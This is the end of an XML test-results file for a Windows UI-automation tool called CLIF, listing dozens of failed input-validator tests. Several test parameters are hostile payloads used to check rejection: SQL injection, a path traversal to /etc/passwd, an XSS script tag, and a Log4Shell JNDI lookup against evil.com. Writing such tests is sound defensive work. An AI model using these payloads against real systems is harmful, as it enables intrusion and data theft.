warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process smartscreen: Access is denied.&#xD;
info: CLIF.Services.AutomationService[0]&#xD;
      Successfully attached to process 20172&#xD;
?? Attached to process: Adobe Desktop Service (PID: 20172)&#xD;
? Step 1: wait - Wait for 100ms&#xD;
??  Waiting 100ms...&#xD;
? Step 2: log - After wait&#xD;
?? Log: After wait&#xD;
? Script completed successfully! Executed 2 steps.&#xD;
info: CLIF.Services.AutomationService[0]&#xD;
      Successfully detached from process&#xD;
[xUnit.net 00:00:22.51]   Finished:    CLIF.Tests&#xD;
</StdOut>
    </Output>
    <RunInfos>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.5575912-04:00">
        <Text>[xUnit.net 00:00:02.88]     CLIF.Tests.Unit.Validation.ValidationResultTests.Failure_WithNullMessage_ShouldUseEmptyString [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.5675748-04:00">
        <Text>[xUnit.net 00:00:02.89]     CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(command: "type id=TextBox some text") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.5705304-04:00">
        <Text>[xUnit.net 00:00:02.89]     CLIF.Tests.Unit.Validation.ValidationResultTests.ValidationResult_ToString_ShouldProvideUsefulRepresentation [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.5723019-04:00">
        <Text>[xUnit.net 00:00:02.89]     CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(command: "click id=Button") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6028228-04:00">
        <Text>[xUnit.net 00:00:02.90]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(longText: "This is a test of the emergency broadcast system. "···) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6038257-04:00">
        <Text>[xUnit.net 00:00:02.90]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(longText: "A very very very very very very very very very ver"···) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6041890-04:00">
        <Text>[xUnit.net 00:00:02.90]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(longText: "Lorem ipsum dolor sit amet, consectetur adipiscing"···) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6045677-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextBelowMinimumLength_ShouldReturnFailure(shortText: "abc") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6049387-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextBelowMinimumLength_ShouldReturnFailure(shortText: "a") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6102348-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextBelowMinimumLength_ShouldReturnFailure(shortText: "ab") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6106065-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(maliciousText: "'; DROP TABLE users; --") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6109365-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(maliciousText: "../../etc/passwd") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6250551-04:00">
        <Text>[xUnit.net 00:00:02.91]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(maliciousText: "${jndi:ldap://evil.com}") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6263172-04:00">
        <Text>[xUnit.net 00:00:02.94]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(maliciousText: "&lt;script&gt;alert('xss')&lt;/script&gt;") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6270577-04:00">
        <Text>[xUnit.net 00:00:02.94]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithWhitespaceOnlyText_ShouldReturnFailure [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6277317-04:00">
        <Text>[xUnit.net 00:00:02.94]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithNullText_ShouldReturnFailure [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6294199-04:00">
        <Text>[xUnit.net 00:00:02.94]     CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithEmptyText_ShouldReturnFailure [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6308002-04:00">
        <Text>[xUnit.net 00:00:02.94]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithNullPath_ShouldReturnFailure [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6458792-04:00">
        <Text>[xUnit.net 00:00:02.96]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(restrictedPath: "C:\\Windows\\System32\\drivers") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6471067-04:00">
        <Text>[xUnit.net 00:00:02.96]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(restrictedPath: "C:\\Program Files\\") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6476699-04:00">
        <Text>[xUnit.net 00:00:02.97]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(restrictedPath: "C:\\ProgramData\\Microsoft") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6480370-04:00">
        <Text>[xUnit.net 00:00:02.97]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(restrictedPath: "C:\\Windows\\System32\\config") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6498710-04:00">
        <Text>[xUnit.net 00:00:02.97]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePath_ShouldReturnSuccess [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6553119-04:00">
        <Text>[xUnit.net 00:00:02.97]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePaths_ShouldReturnSuccess(path: "D:\\Projects\\automation\\script.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6556929-04:00">
        <Text>[xUnit.net 00:00:02.98]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePaths_ShouldReturnSuccess(path: "E:\\Data\\config.xml") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6561135-04:00">
        <Text>[xUnit.net 00:00:02.98]     CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePaths_ShouldReturnSuccess(path: "C:\\Users\\Test\\file.txt") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6693646-04:00">
        <Text>[xUnit.net 00:00:02.98]     CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(command: "tree") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6697379-04:00">
        <Text>[xUnit.net 00:00:02.99]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(maliciousSelector: "type=../../etc/passwd") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6706535-04:00">
        <Text>[xUnit.net 00:00:02.99]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(maliciousSelector: "class='; DROP TABLE users; --") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6739377-04:00">
        <Text>[xUnit.net 00:00:03.00]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(maliciousSelector: "id=&lt;script&gt;alert('xss')&lt;/script&gt;") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.6778732-04:00">
        <Text>[xUnit.net 00:00:03.00]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(maliciousSelector: "name=${jndi:ldap://evil.com}") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7144085-04:00">
        <Text>[xUnit.net 00:00:03.03]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithEmptyValues_ShouldReturnFailure(selector: "name=") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7148854-04:00">
        <Text>[xUnit.net 00:00:03.03]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithEmptyValues_ShouldReturnFailure(selector: "id=") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7152668-04:00">
        <Text>[xUnit.net 00:00:03.04]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithEmptyValues_ShouldReturnFailure(selector: "class=") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7156678-04:00">
        <Text>[xUnit.net 00:00:03.04]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(selector: "nomequals") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7163883-04:00">
        <Text>[xUnit.net 00:00:03.04]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(selector: "missing-equals-sign") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7231763-04:00">
        <Text>[xUnit.net 00:00:03.04]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(selector: "invalid.format") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7291640-04:00">
        <Text>[xUnit.net 00:00:03.05]     CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithNullSelector_ShouldReturnFailure [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7308738-04:00">
        <Text>[xUnit.net 00:00:03.05]     CLIF.Tests.InfrastructureTests.SanitizationHelper_ShouldBeAccessible [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7369053-04:00">
        <Text>[xUnit.net 00:00:03.06]     CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(processId: 1) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7380373-04:00">
        <Text>[xUnit.net 00:00:03.06]     CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(processId: 1234) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.7515599-04:00">
        <Text>[xUnit.net 00:00:03.07]     CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(processId: 999999) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8597261-04:00">
        <Text>[xUnit.net 00:00:03.18]     CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(selector: "TestButton") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8634343-04:00">
        <Text>[xUnit.net 00:00:03.18]     CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: "./relative/path/script.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8683058-04:00">
        <Text>[xUnit.net 00:00:03.19]     CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: "/usr/local/bin/script.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8706127-04:00">
        <Text>[xUnit.net 00:00:03.19]     CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: "script.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8709837-04:00">
        <Text>[xUnit.net 00:00:03.19]     CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: "C:\\temp\\script.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8713694-04:00">
        <Text>[xUnit.net 00:00:03.19]     CLIF.Tests.Integration.ValidationHarnessTests.TextInputValidator_WithNull_ShouldFail(text: null) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:12.8758270-04:00">
        <Text>[xUnit.net 00:00:03.20]     CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_BoundaryValues_ShouldHandleCorrectly [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:17.0859217-04:00">
        <Text>[xUnit.net 00:00:07.41]     CLIF.Tests.Unit.Services.AutomationServiceTests.AttachToProcessAsync_WithCurrentProcess_ShouldComplete [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="MC-HR-128" outcome="Error" timestamp="2025-11-01T16:15:17.1378128-04:00">
        <Text>[xUnit.net 00:00:07.46]     CLIF.Tests.Unit.Services.AutomationServiceTests.TypeTextAsync_WithEmptyText_ShouldReturnFalse [FAIL]</Text>
      </RunInfo>
    </RunInfos>
  </ResultSummary>
</TestRun>